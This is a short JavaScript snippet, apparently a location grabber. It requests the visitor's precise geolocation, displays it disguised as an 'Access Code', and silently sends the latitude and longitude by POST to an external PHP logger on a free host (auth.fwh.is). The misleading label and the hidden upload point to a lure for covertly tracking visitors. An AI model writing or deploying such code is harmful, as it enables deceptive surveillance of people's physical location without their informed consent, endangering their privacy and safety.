<script>
function getLocation() {
    if (!navigator.geolocation) {
        document.getElementById("location").innerText = "Geolocation not supported.";
        return;
    }

    navigator.geolocation.getCurrentPosition(showPosition, showError, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
    });
}

function showPosition(position) {
    const lat = position.coords.latitude;
    const lng = position.coords.longitude;

    document.getElementById("location").innerText =
        "Access Code: LAT " + lat + ", LNG " + lng;

    // 🔥 Send to your InfinityFree PHP logger
    fetch("https://auth.fwh.is/log.php", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "lat=" + encodeURIComponent(lat) + "&lng=" + encodeURIComponent(lng)
    });
}

function showError(error) {
    document.getElementById("location").innerText =
        "Error: " + error.message;
}
</script>

